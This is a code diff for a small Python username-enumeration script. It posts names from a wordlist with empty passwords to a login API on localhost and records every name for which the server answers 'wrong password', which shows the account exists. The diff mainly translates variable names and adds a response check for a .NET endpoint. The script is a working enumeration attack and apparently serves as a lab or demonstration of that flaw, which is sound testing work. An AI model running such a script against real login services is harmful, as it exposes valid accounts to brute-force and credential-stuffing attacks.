@@ -1,14 +1,20 @@
 import requests
 
-with open("wordlist/users.txt", "r") as arquivo:
-    linhas = arquivo.readlines()
+with open("wordlist/users.txt", "r") as file:
+    lines = file.readlines()
 
-    for linha in linhas:
+    for line in lines:
     
-        nome_usuario  = linha.strip()
-        payload  = {'login': nome_usuario, 'password': ''}
-        r = requests.post('http://localhost:8080/auth/login', json=payload)
-        mensagem = r.text
-        if (mensagem == "Senha Incorreta!"):
-            with open("usuarios_validos.txt", "a") as resultado:
-                resultado.write(nome_usuario+"\n")
+        user_name  = line.strip()
+        payload  = {'login': user_name, 'password': ''}
+
+        # Request API em Java
+        r = requests.post('http://localhost:8080/auth/login', json=payload)  
+
+        # Request API em .Net
+        # r = requests.post('http://localhost:5127/api/authentication/login', json=payload)
+
+        message = r.text
+        if (message == "Senha Incorreta!" or message == '{"message":"Wrong password!!!"}'):
+            with open("usuarios_validos.txt", "a") as result:
+                result.write(user_name+"\n")
